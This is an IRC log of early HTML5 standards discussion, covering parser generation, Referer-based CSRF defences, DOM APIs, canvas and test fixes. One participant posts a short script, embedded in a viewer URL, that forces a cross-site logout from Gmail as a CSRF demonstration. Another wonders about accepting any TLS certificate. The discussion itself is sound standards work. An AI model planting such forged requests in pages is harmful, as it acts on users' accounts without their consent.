[14:45:00.0000] <gsnedders>
Philip`: it's rather unclear whether it's doing it as an arts subject or as a science subject, but it looks as if it's a mixture of both

[14:51:00.0000] <kig>
Philip`: ocaml html parser?

[14:52:00.0000] <kig>
aah, perl html parser

[14:52:01.0000] <kig>
nm

[14:53:00.0000] <gsnedders>
kig: no, a perl parser that creates an OCaml HTML parser

[14:53:01.0000] <gsnedders>
(the perl parser uses regex to parse the HTML5 spec, IIRC)

[14:55:00.0000] <Philip`>
It's a Perl script that parses the HTML5 spec to generate an OCaml representation of the script, which can be executed directly in OCaml or can (soon) be compiled down into Perl code to implement an HTML5 parser (and also C++ and JS etc)

[14:55:01.0000] <Philip`>
s/of the script/of the parser algorithm/

[14:56:00.0000] <Philip`>
It's basically just http://lists.w3.org/Archives/Public/public-html/2007Jul/1103.html but for the tree construction stage too


2008-02-10
[16:03:00.0000] <Philip`>
Hmm, is html5.org dead?

[16:06:00.0000] <Philip`>
http://canvex.lazyilluminati.com/misc/insertion_modes.svg (red = error transition; blue = non-error reprocess-as-if transition; black = non-error permanent transition)

[16:06:01.0000] <Philip`>
with only a small number of known bugs in there

[16:06:02.0000] <Hixie>
i love anne's comment on <canvas>:

[16:07:00.0000] <Hixie>
"The section should be more clear what it means by image. ..."

[16:07:01.0000] <Hixie>
which section?

[16:07:02.0000] <Hixie>
that's how the e-mail starts. which fricking section???

[16:07:03.0000] <Philip`>
The canvas section? :-)

[16:08:00.0000] <Hixie>
that doesn't help much :-P

[16:08:01.0000] <Hixie>
maybe he means 3.14.11.3. Security with canvas elements

[16:08:02.0000] <Hixie>
i think i must have fixed this comment already

[16:10:00.0000] <Hixie>
maybe he means the origin section itself?

[16:11:00.0000] <Philip`>
(Aha, html5.org is back, hence http://philip.html5.org/misc/insertion-modes.svg )

[16:12:00.0000] <Hixie>
safari fails at that image.

[16:12:01.0000] <Hixie>
hat's red?

[16:12:02.0000] <Hixie>
parse error?

[16:12:03.0000] <Hixie>
how abotu blue?

[16:12:04.0000] <Philip`>
red = error transition; blue = non-error reprocess-as-if transition; black = non-error permanent transition

[16:13:00.0000] <Hixie>
brb, intermission shift.

[16:32:00.0000] <Hixie>
Philip`: cool

[16:33:00.0000] <Hixie>
Philip`: looks like you have some missing. e.g. EOF in a number of the main phase cases

[16:33:01.0000] <Hixie>
in fact _BeforeHead has only one exiting arrow

[16:33:02.0000] <Hixie>
which seems unlikely

[16:34:00.0000] <Philip`>
EOF doesn't explicitly transition to any insertion mode, which is why it isn't shown

[16:34:01.0000] <Hixie>
ah ok

[16:35:00.0000] <Philip`>
It might do transitions while generating implied end tags, but those will be a subset of the transitions that are already shown

[16:35:01.0000] <Hixie>
the transitions for a single character "X" seem wrong

[16:35:02.0000] <Hixie>
initial phase -> root element -> _beforehead -> ?

[16:36:00.0000] <Philip`>
...and it might do transitions when acting as if there were new start/end tags

[16:36:01.0000] <Hixie>
aaah

[16:36:02.0000] <Hixie>
you should show those too :-)

[16:37:00.0000] <Philip`>
In BeforeHead it does some internal magic (like pretending there's a <head>) and then performs the only possible transition to InHead

[16:38:00.0000] <Hixie>
makes sense

[16:38:01.0000] <Philip`>
Duplicate the "Start tag [head]" arrow and call it "Character not [...]" etc for each act-as-if-a-start-tag-named-head bit?

[16:40:00.0000] <Hixie>
or just put an asterisk next to the transitions that happen due to other cases

[16:40:01.0000] <Hixie>
labelled "* Also happens due to other tokens" or something

[16:40:02.0000] <Hixie>
or "* May be implied"

[16:44:00.0000] <Philip`>
http://philip.html5.org/misc/insertion-modes-2.svg handles act-as-if-start-tag

[16:46:00.0000] <Philip`>
Hmm, stack overflow if I try it with end tags

[16:49:00.0000] <Philip`>
...because </p> can create a <p>, and <p> can create a </p>

[16:49:01.0000] <Philip`>
(in body)

[16:51:00.0000] <Hixie>
heh

[16:59:00.0000] <Philip`>
http://philip.html5.org/misc/insertion-modes-3.svg handles act-as-if-(start|end)-tag

[16:59:01.0000] <Philip`>
and is getting a little ugly :-(

[17:00:00.0000] <Philip`>
(It's intentional that <noscript> isn't handled, because I haven't translated that bit yet)

[17:01:00.0000] <Hixie>
i think my asterisk idea wins :-P

[17:02:00.0000] <Hixie>
found any errors in the spec yet? :-D

[17:02:01.0000] <othermaciej>
so the "please don't dereference these http URIs" post from the w3c made it to reddit

[17:02:02.0000] <Philip`>
If I added asterisks, I'd have to add some way to delete duplicates, and that would require lines of code :-(

[17:02:03.0000] <othermaciej>
I am amazed how many people support the concept of using http URIs as opaque identifiers not meant to be dereferenced

[17:02:04.0000] <Hixie>
i think we clearly should learn from this that using URIs for things that are opaque identifiers not meant to be dereferenced is dumb

[17:02:05.0000] <othermaciej>
barely a moment's thought given to whether that might be a dumb idea in the first place

[17:03:00.0000] <Hixie>
Philip`: heh

[17:04:00.0000] <Philip`>
You can just look at http://philip.html5.org/misc/insertion-modes.svg and imagine a "..., or may be implied" beside each transition

[17:07:00.0000] <Philip`>
Hixie: There's a few things that don't entirely seem sensible in there (so I've sent mail to public-html), but I haven't tried looking hard for errors yet :-)

[17:08:00.0000] <Philip`>
/me wants to create hundreds of thousands of test cases to see if all the parsers interoperate

[17:09:00.0000] <Hixie>
k

[17:17:00.0000] <tantek>
FWIW I'm quite firmly on the other side re: http URIs, in strong support of dereferenceable URLs (not a typo), e.g. for XMDP profiles.

[17:18:00.0000] <othermaciej>
a dereferencable URL for something meant to be dereferenced is fine

[17:18:01.0000] <othermaciej>
but an allegedly opaque identifier starting with "http:" and having the format of a URL is just dumb

[17:19:00.0000] <tantek>
IMHO a URI using the "http" protocol implies dereferencability.

[17:21:00.0000] <othermaciej>
that's certainly how it seems to most people

[17:22:00.0000] <Dashiva>
Any transfer protocol would be an odd choice for non-transfer, really

[17:24:00.0000] <Philip`>
<html xmlns="data:,w3.org XHTML"> - still a URI, still uses DNS for 'guaranteed' uniqueness and allows many distinct values for the same domain

[17:24:01.0000] <tantek>
agreed Dashiva. Any URI using a transfer protocol implies dereferenceability, and specs SHOULD NOT discourage dereferenceability of such URIs.

[17:25:00.0000] <tantek>
in fact, one might even say that specs which use URIs MUST NOT place additional such restrictions on the URIs, as that would be a layer violation.

[19:58:00.0000] <jruderman>
will <video> work well for streaming formats?

[19:58:01.0000] <jruderman>
such as real-time porn cams

[01:09:00.0000] <hsivonen>
the idea of using URIs as identifiers rather than locators ignores the main affordance of URIs

[01:10:00.0000] <hsivonen>
in that sense, we should have stayed with URLs and the URI thing was a mistake

[04:36:00.0000] <annevk>
Philip`, is your parser faster than the Java parser?

[04:37:00.0000] <Philip`>
annevk: My C++ tokeniser was faster than the Java tokeniser (at least in the particular case that I was testing)

[04:38:00.0000] <annevk>
you haven't converted the OCaml parser to C++ yet?

[04:40:00.0000] <Philip`>
No, and the tree constructor part doesn't quite work in OCaml yet either

[04:43:00.0000] <annevk>
k

[05:52:00.0000] <zcorpan_>
http://www.sitepoint.com/forums/showthread.php?t=531009

[07:01:00.0000] <met_>
/me just testing postMessage http://ejohn.org/apps/message/ 

[07:01:01.0000] <gsnedders>
the spec gen truly is bizarre.

[07:01:02.0000] <met_>
anyone knows why it doesn't work in opera?

[07:01:03.0000] <met_>
/me thougt Opera implemented postMessage already

[07:04:00.0000] <annevk>
Opera implemented it on document instead of window

[07:04:01.0000] <met_>
oh

[07:04:02.0000] <annevk>
(this is changing)

[07:04:03.0000] <met_>
ok, I  have missed thaht

[07:16:00.0000] <gsnedders>
Hixie: playing around with various concepts I have for implementing the spec-gen clone, it's gonna be quick. really quick.

[07:16:01.0000] <gsnedders>
(and by playing around I mean playing around with a DOM tree of the HTML 5 spec, so a really large doc)

[07:58:00.0000] <annevk>
Hixie, in http://lists.w3.org/Archives/Public/www-archive/2008Jan/0078.html you said you changed test 43 but it seems that you did not do that

[11:23:00.0000] <Hixie>
annevk: as far as i can tell i did; what's not fixed?

[11:27:00.0000] <Philip`>
Hmm... Opera has a feature to import bookmarks from Firefox

[11:28:00.0000] <Philip`>
Firefox 3 stores bookmarks in an SQLite database

[11:28:01.0000] <Philip`>
Hence, Opera will have to include SQLite so that it can continue to import from Firefox

[11:28:02.0000] <D2xSadEagle>
/me can't say he blames FF people for using something like SQLite.

[11:28:03.0000] <D2xSadEagle>
though don't they always run only one process? Cheaters :p

[11:29:00.0000] <Philip`>
Since it already has to pay the code-size and integration cost of SQLite, it will cost approximately nothing extra to support client-side database storage in a way that's compatible with Firefox

[11:29:01.0000] <Philip`>
And so the world will be happy and interoperable, which is good

[11:30:00.0000] <Hixie>
it frightens me that Julian is arguing that servers don't assume that a missing Referer means that the request should be allowed

[11:30:01.0000] <Philip`>
(And any other browser that wants to attract Firefox users will have to offer a similar import feature, and so will have to have SQLite too)

[11:31:00.0000] <Dashiva>
Philip`: Well, that all assumes FF3 will be released before DNF :)

[11:32:00.0000] <Hixie>
/me wonders how to respond to someone who has such a feeble grasp of the realities of deployed content

[11:33:00.0000] <Philip`>
Hixie: If they do assume that, it should be easy to give some examples of open source code with that assumption

[11:34:00.0000] <Philip`>
It seems the much more common situation (mainly to avoid image hot-linking) is for servers to assume a non-missing different-origin Referer means the request should be denied

[11:34:01.0000] <Philip`>
(which isn't the same as assuming a missing Referer means the request should be trusted)

[11:35:00.0000] <Hixie>
right

[11:35:01.0000] <Philip`>
(because nothing particularly bad happens when someone hot-links an image and 1% of users don't send Referer and therefore don't get redirected to a rude message)

[11:36:00.0000] <Hixie>
feel free to point him to code doing this if you know of any

[11:36:01.0000] <Philip`>
I don't know of any

[11:36:02.0000] <Hixie>
yeah me either

[11:36:03.0000] <Hixie>
i just know it's very common :-)

[11:36:04.0000] <Philip`>
You're the one arguing that servers do make assumptions :-p

[11:37:00.0000] <hsivonen>
b.m.o at least used to block slashdot referers but allows no referer

[11:37:01.0000] <Philip`>
and arguing without evidence is not very convincing :-)

[11:37:02.0000] <webben>
What does Apache do by default?

[11:37:03.0000] <hsivonen>
webben: just logs the referer

[11:38:00.0000] <webben>
IIS?

[11:38:01.0000] <Hixie>
Philip`: indeed

[11:38:02.0000] <Dashiva>
Philip`: My image leech prevention script assumes a missing referer is local

[11:38:03.0000] <Hixie>
guess i'll have to do more research

[11:38:04.0000] <Dashiva>
It's not open source, though

[11:39:00.0000] <Hixie>
time to go to the rehearsal though

[11:39:01.0000] <Hixie>
bbl

[11:39:02.0000] <Philip`>
hsivonen: b.m.o isn't blocking certain referrers in order to avoid CSRF, so it's not really relevant to the argument about no-referrer pings being bad for security

[11:39:03.0000] <Philip`>
and the same for all the image leech prevention scripts

[11:40:00.0000] <hsivonen>
Philip`: using Referer for security purposes seems like a very brittle and RFC 2616-incompliant idea to me

[11:41:00.0000] <Philip`>
hsivonen: If we assumed people were sensible, then that would mean people wouldn't use Referer for security purposes, and so there's no danger in sending pings with no Referer

[11:42:00.0000] <hsivonen>
which one of Julian's messages are we talking about?

[11:42:01.0000] <Philip`>
I think the first paragraph of http://lists.w3.org/Archives/Public/public-html/2008Feb/0164.html

[11:49:00.0000] <Philip`>
http://google.com/codesearch?q=show:J2QBLfV3jjo:NRV5Vj3R4SI:1curwdNzfbk&cs_p=ftp://t3domains.de/pub/TYPO3-complete-package/current-version/yamlt3-V4.5.0.zip&cs_f=yamlt3/typo3/sysext/cms/tslib/class.tslib_fe.php#l2106

[11:49:01.0000] <hsivonen>
hmm. using Referer as an anti-CSRF mechanism still seems like a very bad idea unless it is merely used as an optimization in a mechanism that actuallly works

[11:49:02.0000] <Philip`>
That's something that prevents email form submission if the Referer is wrong or missing

[11:53:00.0000] <tndH>
Philip`: lucky for them, fx3 exports its bookmarks to an html file on shutdown ;)

[11:55:00.0000] <Philip`>
http://google.com/codesearch?q=show:H3ulLINfCo0:QkWYPi2-xVM:o8NYFfBdVkY&cs_p=http://freshmeat.net/redir/punbb/46741/url_tgz/punbb-1.2.15.tar.gz&cs_f=punbb-1.2.15/upload/include/functions.php#l671

[11:55:01.0000] <Philip`>
That also prevents things if Referer is wrong or missing

[12:00:00.0000] <Philip`>
http://google.com/codesearch?q=show:BILmTBaOV7w:J2LE5gqHQ64:eBTzqE7cT8s&cs_p=http://wphooks.flatearth.org&cs_f=hooks/check_admin_referer/-001#first

[12:00:01.0000] <Philip`>
There's another one

[12:00:02.0000] <Philip`>
So I still haven't seen one that thinks missing referer means the request can be trusted...

[12:03:00.0000] <Philip`>
tndH: Oh :-(

[12:04:00.0000] <Philip`>
http://google.com/codesearch?q=show:cFRMv4O2bGI:eriQ8VkTUd4:dQQ6OTNA-Bs&cs_p=https://svn.radicaldesigns.org/amp/trunk&cs_f=punbb/admin_options.php#l41

[12:04:01.0000] <Philip`>
That also rejects missing referer

[12:06:00.0000] <Philip`>
http://google.com/codesearch?q=show:2v0x4p249hg:NM4BWguMEFY:lqNJFi-SHlc&cs_p=http://scoop.kuro5hin.org/dist/releases/scoop_1.1.7.tar.gz&cs_f=scoop-1.1.7/lib/Scoop/Admin.pm#l8

[12:12:00.0000] <Philip`>
http://google.com/codesearch?q=show:aVoQhiwqoGk:-V6ZnWGm9lc:vBMeJnZMb1M&cs_p=http://www.dcscripts.com/localFTP/gdcf625.tar.gz&cs_f=./dcf625/cgi-bin/dcforum/dcboard.cgi#l344

[12:13:00.0000] <Philip`>
/me gives up looking

[12:13:01.0000] <Philip`>
So, I still don't have any evidence that sending requests with a missing Referer is going to introduce security issues in existing software

[12:14:00.0000] <Philip`>
(though obviously I also don't have any evidence that it isn't)

[12:17:00.0000] <Philip`>
hsivonen: Do you know of some specific anti-CSRF mechanisms that do work?

[12:18:00.0000] <Philip`>
/me is currently unable to think of any

[12:21:00.0000] <Philip`>
http://software.hixie.ch/utilities/js/live-dom-viewer/?%3C!DOCTYPE%20html%3E%0A%3Cscript%3Evar%20xhr%3Dnew%20XMLHttpRequest()%3Bxhr.open(%27GET%27%2C%20%27https%3A%2F%2Fmail.google.com%2Fmail%2F%3Flogout%26hl%3Den-GB%27)%3Bxhr.send(null)%3C%2Fscript%3E

[12:21:01.0000] <Philip`>
In Firefox 3, that doesn't work very happily

[12:22:00.0000] <Philip`>
presumably because of the Access-Control stuff introducing new CSRF vulnerabilities

[12:23:00.0000] <Philip`>
annevk: Is that a known problem or a bug in Firefox or something?

[12:25:00.0000] <Philip`>
Oh, maybe not

[12:25:01.0000] <Philip`>
It's not anything new, because <script src="https://mail.google.com/mail/?logout&hl=en-GB"></script> has the same effect

[12:25:02.0000] <Philip`>
Is it a bug in Gmail, or is the web just fundamentally broken?

[12:25:03.0000] <zcorpan_>
hsivonen: apparently some people use transitional because the software they use emit stuff that only validates as transitional

[12:27:00.0000] <zcorpan_>
hsivonen: and so it might be worth to look into the default templates of popular CMSs and blogs and which errors they get when validating as html5

[12:27:01.0000] <zcorpan_>
(but i guess the results would be pretty much the same as what you've already got)

[12:27:02.0000] <hsivonen>
zcorpan_: good idea

[12:28:00.0000] <hsivonen>
zcorpan_: altough the generated stuff in CMSs is harder to change than the templates, so it would be even more interesting to isolate the template parts somehow

[12:29:00.0000] <zcorpan_>
yeah

[12:34:00.0000] <hsivonen>
I see <a name> and target=_blank in what I think is the Blogger default

[12:35:00.0000] <hsivonen>
additionally, the blogger navbar has every presentational iframe attribute

[12:35:01.0000] <zcorpan_>
"SMF and WordPress both output target="_blank"." -- http://www.sitepoint.com/forums/showthread.php?p=3718885

[12:36:00.0000] <hsivonen>
what's SMF?

[12:36:01.0000] <zcorpan_>
probably http://www.simplemachines.org/

[12:36:02.0000] <hsivonen>
never heard

[12:37:00.0000] <zcorpan_>
i hadn't, either

[12:37:01.0000] <Philip`>
SMF seems to be fairly popular

[12:37:02.0000] <Philip`>
https://labs.mozilla.com/forum/ uses it

[12:40:00.0000] <hsivonen>
Can't validate that one with Validator.nu

[12:40:01.0000] <hsivonen>
the SSL cert is not supported by Sun JDK

[12:42:00.0000] <Philip`>
http://html5.validator.nu/?doc=http%3A%2F%2Fwww.simplemachines.org%2Fcommunity%2Findex.php looks unhappy

[12:42:01.0000] <hsivonen>
zcorpan_: WordPress default has profile at least: http://html5.validator.nu/?doc=http%3A%2F%2Fthemes.wordpress.net%2Ftestrun%2F

[12:43:00.0000] <Philip`>
and http://html5.validator.nu/?doc=http://www.cyberscoreforums.com/ (SMF 1.x, whereas the other one was 2.x) looks similar

[12:43:01.0000] <hsivonen>
ah. language="JavaScript" all over the place

[12:50:00.0000] <hsivonen>
Sun's certificate management docs aren't as obvious as I'd like :-(

[12:53:00.0000] <hsivonen>
I wonder if there's a way to ask HttpClient to accept any cert and only use TLS for encryption--not for verifying the idintity of the other party

[12:53:01.0000] <zcorpan_>
<link rel="help" href="http://www.cyberscoreforums.com/index.php?action=help" target="_blank" /> (from cyberscoreforums.com)

[13:32:00.0000] <zcorpan_>
wonder if we should allow <img with=0 height=0>

[13:32:01.0000] <zcorpan_>
er

[13:32:02.0000] <zcorpan_>
width

[13:37:00.0000] <annevk>
Philip`, Google doing actions on the user's behalf based on a GET request seems to be broken

[13:40:00.0000] <gsnedders>
annevk: seeming you said you'd explain to me anything I didn't get from the DOM specs, what does compareDocumentPosition() return?

[13:40:01.0000] <Philip`>
I suppose doing actions on a POST request would be broken too, because anyone could set up a form and submit it via JS

[13:41:00.0000] <Philip`>
so it's basically impossible to safely allow actions

[13:41:01.0000] <SadEagle>
gsnedders: it's an untranslatable string of curses in the direction of whoever thought up of this function

[13:41:02.0000] <gsnedders>
:D

[13:41:03.0000] <SadEagle>
Philip`: check out some stuff in http rfc about pipelining and idempotency, for extra fun.

[13:41:04.0000] <gsnedders>
at a really basic level, how can I tell if something occurs before something else?

[13:42:00.0000] <annevk>
yes

[13:42:01.0000] <annevk>
though not all browsers might support it

[13:43:00.0000] <annevk>
also, iirc it returns an integer that maps to some constant

[13:43:01.0000] <gsnedders>
oh yuk.

[13:43:02.0000] <SadEagle>
hmm, it's actually not so expensive to implement as I first thought.

[13:43:03.0000] <kig>
the usual solution to ajax api is to trust the browser to not leak cookies outside SOP and use the cookie secret for authenticating requests by adding the secret as a var to the post req

[13:43:04.0000] <SadEagle>
gsnedders: this seems to explain it: http://www.quirksmode.org/blog/archives/2006/01/contains_for_mo.html

[13:44:00.0000] <gsnedders>
SadEagle: thx

[13:44:01.0000] <kig>
s/usual/what i've been using/

[13:45:00.0000] <SadEagle>
np

[13:45:01.0000] <SadEagle>
there is a separate section in DOM3 core explaining it too, just search for DocumentPosition... For some reason the method specs don't refer to it..

[13:46:00.0000] <gsnedders>
that'll be why I didn't find it.

[13:46:01.0000] <SadEagle>
/me loves DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC

[13:46:02.0000] <gsnedders>
yeah, I just noticed that

[13:46:03.0000] <Philip`>
kig: Hmm, that sounds quite reasonable

[13:46:04.0000] <gsnedders>
SadEagle: sadly, too often order isn't defined in DOM

[13:48:00.0000] <SadEagle>
they have a disconnected flag, though

[13:48:01.0000] <annevk>
wow, someone should clean that up and remove that constant

[13:49:00.0000] <gsnedders>
DOM5!

[13:49:01.0000] <gsnedders>
next year of school will suck. No longer in Secondary 5 :(

[13:51:00.0000] <zcorpan_>
dom5 core is on my list of things to do...

[13:51:01.0000] <annevk>
Hixie, "input2.setAttribute("checked", "checked"); // sets defaultChecked, doesn't change actual state" does change the state in deployed browsers

[13:51:02.0000] <gsnedders>
zcorpan_: you can use me a test subject as someone who doesn't know much about DOM :P

[13:52:00.0000] <zcorpan_>
gsnedders: i don't follow

[13:53:00.0000] <gsnedders>
zcorpan_: To make sure DOM5 Core actually makes sense to those who don't know much about DOM

[13:53:01.0000] <zcorpan_>
gsnedders: ah

[13:53:02.0000] <zcorpan_>
gsnedders: not sure that should be a goal though

[13:53:03.0000] <SadEagle>
gsnedders: coincidentally, DOM* Core is probably the best-specified part of DOM.

[13:54:00.0000] <gsnedders>
SadEagle: I'm aware.

[13:54:01.0000] <Hixie>
annevk: oh, in the radio button tests. i thought you were talking about the checkbox tests.

[13:55:00.0000] <SadEagle>
/me wonders whether someone will be tackling saneification of DOM2 HTML... I guess some parts of WF2 overlap, though.

[13:55:01.0000] <gsnedders>
SadEagle: HTML 5 is, AFAIK

[13:55:02.0000] <zcorpan_>
yeah

[13:55:03.0000] <SadEagle>
poor Hixie :-)

[13:57:00.0000] <Hixie>
annevk: wow, that's a big bug in the spec. i'd better make sure i fix that in html5.

[13:58:00.0000] <annevk>
i doubt that's possible

[13:59:00.0000] <annevk>
HTML5 fixed most of DOM2 HTML

[13:59:01.0000] <Hixie>
i mean a big bug in the dom2 html spec

[14:00:00.0000] <annevk>
ok

[14:00:01.0000] <Hixie>
i haven't checked wf2

[14:00:02.0000] <Hixie>
/me mails himself

[14:07:00.0000] <Hixie>
annevk: k, fixed the test

[14:09:00.0000] <annevk>
how can input1 still be checked?

[14:10:00.0000] <annevk>
.defaultChecked is exactly equivalent to setAttribute("checked", "checked") ...

[14:10:01.0000] <annevk>
or did you change other things, too?

[14:11:00.0000] <Hixie>
wait i thought you said that setting setAttribute("checked", "checked") was specifically _not_ equivalent to setting defaultChecked?

[14:11:01.0000] <Hixie>
so you're saying that setting defaultChecked also changes checked???

[14:12:00.0000] <annevk>
yes

[14:12:01.0000] <annevk>
sorry for not being more specific initially

[14:13:00.0000] <annevk>
maybe I'm wrong

[14:16:00.0000] <Dashiva>
Wouldn't it be nice if there was a website that would screenshot a given page in IE6+7, FF2+3, Safari2+3 and Opera9.2+9.5 and display the results?

[14:16:01.0000] <Hixie>
/me puts it back to what it used to be

[14:16:02.0000] <Hixie>
Dashiva: there is

[14:16:03.0000] <Dashiva>
really?

[14:16:04.0000] <Dashiva>
And not a paid service?

[14:16:05.0000] <Hixie>
yes

[14:16:06.0000] <Hixie>
i forget the url

[14:16:07.0000] <Hixie>
but there are some

[14:16:08.0000] <Dashiva>
Hmm... guess it's google time

[14:17:00.0000] <annevk>
http://software.hixie.ch/utilities/js/live-dom-viewer/?%3C!DOCTYPE%20html%3Ex%3Cinput%20name%3Dradio%20type%3Dradio%3E%3Cinput%20name%3Dradio%20type%3Dradio%3E%3Cscript%3Evar%20i%20%3D%20document.getElementsByTagName(%22input%22)%3B%20i[0].defaultChecked%20%3D%20true%3B%20i[1].defaultChecked%20%3D%20true%20%3C%2Fscript%3E

[14:17:01.0000] <annevk>
Firefox seems inconsistent

[14:18:00.0000] <Hixie>
well i've put it back to what the spec says

[14:18:01.0000] <annevk>
but given how inconsistent Firefox is I'm not sure we can fix it

[14:22:00.0000] <Philip`>
Dashiva: http://browsershots.org/ ?

[14:22:01.0000] <Dashiva>
Yeah, looking at that now

[14:43:00.0000] <annevk>
Hixie, because of "iframe { float: left; height: 0; width: 0; }" some of the media query tests are invalid

[14:43:01.0000] <annevk>
specifically, y1, y2, y3, and y4 will not function as expected

[14:43:02.0000] <annevk>
(if I uncomment that CSS line the media query tests pass in Opera as expected)

[14:46:00.0000] <Hixie>
oh the media queries depend on the iframe dimensions?

[14:47:00.0000] <annevk>
y1, y2, y3, y4 test the width and height media features

[14:47:01.0000] <Hixie>
yes

[14:47:02.0000] <Hixie>
i didn't realise that those heights and widths were the viewport dimensions

[14:47:03.0000] <Hixie>
of the inner viewport

[14:48:00.0000] <annevk>
they are

[14:48:01.0000] <Hixie>
but indeed it is

[14:48:02.0000] <annevk>
you could change them to min-device-width etc. I suppose

[14:48:03.0000] <Hixie>
fixed

[14:50:00.0000] <Hixie>
there, let me know if that works

[14:50:01.0000] <annevk>
that works, but you should update the comment to say that the tests assume a 0x0 window

[14:50:02.0000] <annevk>
"// the next four assume that the window is bigger than 1em by 1em at the time the test is run"

[14:51:00.0000] <Hixie>
fixed

[14:51:01.0000] <annevk>
great

[14:52:00.0000] <Hixie>
that broke safari

[14:52:01.0000] <annevk>
bonus points

[14:52:02.0000] <annevk>
;)

[14:54:00.0000] <salty-horse>
this may be old news. graphviz over canvas: http://www.ryandesign.com/canviz/

[14:56:00.0000] <Philip`>
/me hadn't seen that before

[14:56:01.0000] <Philip`>
Looks like it works well :-)

[14:57:00.0000] <Philip`>
Is it possible for someone to enter their own dot files?

[14:58:00.0000] <salty-horse>
I just saw this link on graphviz.org :)

[15:03:00.0000] <Philip`>
/me fails to find any information about it other than https://mailman.research.att.com/pipermail/graphviz-interest/2007q3/004709.html

[15:05:00.0000] <Hixie>
Philip`: you've tested <canvas> the most, do you know if it's the case today that all <canvas> implementations create backing stores the same dimensions as the coordinate space?

[15:07:00.0000] <salty-horse>
Philip`, since the graphviz xdot output parsing is on the client-side, you already have all of the source code :)

[15:08:00.0000] <Philip`>
Hixie: I think WebKit might use a different scale if you some secret hidden OS X feature to change the UI scaling factor or something like that, but I've never tried that myself

[15:08:01.0000] <Philip`>
s/ / use /

[15:08:02.0000] <Hixie>
but other than that, they all just use the coordinate space?

[15:09:00.0000] <Hixie>
so if i have <canvas height=1 width=1> and  canvas { height: 100%; width: 100%; }  they all screw it up?

[15:09:01.0000] <annevk>
Firefox and Opera "do"

[15:10:00.0000] <Philip`>
The internal buffer is always independent of the size rendered on the screen

[15:10:01.0000] <annevk>
although in that case it's debatable what should happen as CSS stuff is just resizing after all the <canvas> stuff happened

[15:10:02.0000] <Philip`>
It wouldn't really make sense otherwise, given that you can change the rendered size easily

[15:10:03.0000] <Hixie>
i'm not saying the css stuff should control the buffer size

[15:10:04.0000] <Philip`>
(like by resizing the window if it's width:100%)

[15:10:05.0000] <Hixie>
i'm just asking if that would always make a 1x1 buffer

[15:11:00.0000] <Philip`>
I think in WebKit it would be (1*UI scaling factor)x(1*UI scaling factor), where UI scaling factor = 1 unless you're using developer tools to change it

[15:12:00.0000] <Hixie>
k

[15:12:01.0000] <Philip`>
(but I could be wrong :-) )

[15:12:02.0000] <Hixie>
that seems sad

[15:12:03.0000] <roc>
we're always 1:1

[15:12:04.0000] <Philip`>
Why?

[15:13:00.0000] <roc>
changing that would be pretty easy, but someone has to think about dynamic DPI changes

[15:13:01.0000] <Philip`>
s/^/Hixie: /

[15:14:00.0000] <Hixie>
Philip`: because it means that i can't pick a convenient coordinate space

[15:15:00.0000] <Philip`>
Not quite sure what you mean

[15:15:01.0000] <Hixie>
Philip`: i have to think about what my biggest likely rendering size (in terms of css pixels) will be

[15:15:02.0000] <Hixie>
instead of just saying "well i'll just work in the range 0..1"

[15:16:00.0000] <Philip`>
ctx.scale(canvas.width, canvas.height) would let you work in the range 0..1

[15:16:01.0000] <Hixie>
true

[15:17:00.0000] <roc>
Hixie: someone has to think about that. The browser can't really know.

[15:17:01.0000] <Hixie>
the browser could just use big abcking stores

[15:18:00.0000] <roc>
if it didn't care about performance

[15:18:01.0000] <Hixie>
right

[15:18:02.0000] <roc>
it turns out we do care about performance

[15:18:03.0000] <Hixie>
that's a tradeoff each browser vendor can make

[15:18:04.0000] <annevk>
if the author wants hires they should just use a huge <canvas>

[15:18:05.0000] <annevk>
imo

[15:18:06.0000] <roc>
it's useful to be able to get information from authors. Some authors care about performance too

[15:19:00.0000] <annevk>
and then scale using CSS

[15:19:01.0000] <Philip`>
Do any authors not care about performance?

[15:20:00.0000] <Philip`>
<canvas> is always going to be slow, because people want hi-res full-screen canvases with millions of pixels, so performance is unlikely to ever become irrelevant

[15:23:00.0000] <Philip`>
/me likes to think of <canvas> as dynamic <img>, where you just say it's got w*h pixels and you can stick colour values in them, and tries not to think of <img src=x.svg> which breaks that model

[15:24:00.0000] <Philip`>
and anything more complex makes my head hurt


2008-02-11
[16:37:00.0000] <Philip`>
/me notices that his text node coalescence thing totally breaks with foster parenting

[17:13:00.0000] <kig>
img src=x.svg is a canvas with x.svg drawn onto it

[17:13:01.0000] <kig>
(ha ha)

[17:48:00.0000] <Philip`>
Oh, and now the foster parenting breaks my previous mechanism for splitting the generic CDATA algorithm to work on tokens one at a time

[17:49:00.0000] <Philip`>
/me really doesn't like it :-(

[18:18:00.0000] <Philip`>
http://parsetree.validator.nu/?doc=http://philip.html5.org/misc/fostered-adoption-2.html

[18:18:01.0000] <Philip`>
html5lib and Validator.nu don't match Firefox or Safari for that

[18:20:00.0000] <Philip`>
(I don't know whether html5lib etc is implementing HTML5 non-buggily or not)

[18:20:01.0000] <Philip`>
/me just wants to decide that the fostering thing is broken so he can not bother implementing it

[18:24:00.0000] <dbaron>
Hixie, do you still stand by https://bugzilla.mozilla.org/show_bug.cgi?id=54696#c13 ?

[18:24:01.0000] <dbaron>
Hixie, or do you think Mozilla's list-around-float behavior should just switch to match Safari and IE?

[18:24:02.0000] <dbaron>
Hixie, (I'd note that float-displace seems to have disappeared from all CSS drafts...)

[18:26:00.0000] <SadEagle>
dbaron: if you care: http://lists.kde.org/?l=kde-commits&m=119170968024486&w=2

[18:27:00.0000] <SadEagle>
IOW, at least some people rely on something like that.

[18:29:00.0000] <SadEagle>
Not sure it's the same thing, actually, but perhaps the testcase in http://bugs.kde.org/show_bug.cgi?id=150474#c2 will tell you something. (Could just be a similar-sounding bug, I don't know the rendering/CSS stuff)

[20:11:00.0000] <Hixie>
dbaron: what do the other two browsers do?

[20:11:01.0000] <dbaron>
Hixie, other browsers make the bullets overlap the floats

[20:11:02.0000] <dbaron>
Hixie, the bullet is always displaced from the first line by border+padding

[20:11:03.0000] <dbaron>
Hixie, but the line isn't moved to compensate

[20:12:00.0000] <Hixie>
so the bullet are on the left of a left float?

[20:12:01.0000] <dbaron>
Hixie, (see also the three messages I just sent to www-style about float-displace)

[20:12:02.0000] <dbaron>
Hixie, no, they overlap a left float

[20:13:00.0000] <Hixie>
right but on which side though? left?

[20:13:01.0000] <dbaron>
they're a fixed distance (border + padding of the list item) from the right edge of the left float

[20:14:00.0000] <dbaron>
it's the formula you'd want if you also had float-displace indenting the line

[20:14:01.0000] <Hixie>
then i don't understand what you mean by "the line isn't moved to compensate"

[20:15:00.0000] <dbaron>
